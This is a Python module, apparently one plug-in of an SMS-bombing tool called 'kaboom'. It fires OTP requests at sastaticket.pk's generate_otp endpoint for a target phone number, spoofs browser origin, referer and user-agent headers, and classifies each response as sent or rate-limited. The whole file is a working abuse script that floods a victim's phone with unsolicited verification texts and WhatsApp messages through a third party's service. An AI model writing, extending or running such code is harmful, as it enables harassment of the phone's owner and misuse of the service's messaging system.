from kaboom.core import *
from kaboom.localuseragent import *

async def sastaticket(phone, client, out):
    name = "sastaticket"
    domain = "sastaticket"
    frequent_rate_limit=False
    headers = {
        'content-type': 'application/json',
        'origin': 'https://www.sastaticket.pk',
        'referer': 'https://www.sastaticket.pk/',
        'user-agent': random.choice(ua["browsers"]["chrome"])
    }

    json_data = {
        'mobile_number':f"+92{phone[-10:]}",
    }

    response = await client.post('https://backend.sastaticket.pk/api/v3/users/generate_otp/', headers=headers, json=json_data)
    if response.status_code == 202 and not response.text.strip():
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
        return None
    try:
        data=response.json()
        response_data = data.get("data")
        if isinstance(response_data, dict):
            message = response_data.get("message")
        elif isinstance(response_data, str):
            message = response_data
        else:
            message = data.get("message")

        if message == "A text message has been sent to your authorized mobile number and WhatsApp account with OTP for validation.":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if message == "OTP is already sent. Please try it again.":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False, "reason": message})
            return None
        else:
            reason = message or "otp request failed"
            reason_text = str(reason).lower()
            is_rate_limited = "already sent" in reason_text or "try it again" in reason_text or "wait" in reason_text or "limit" in reason_text
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": is_rate_limited, "sent": False, "error": not is_rate_limited, "reason": reason})
            return None
    except Exception as exc:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
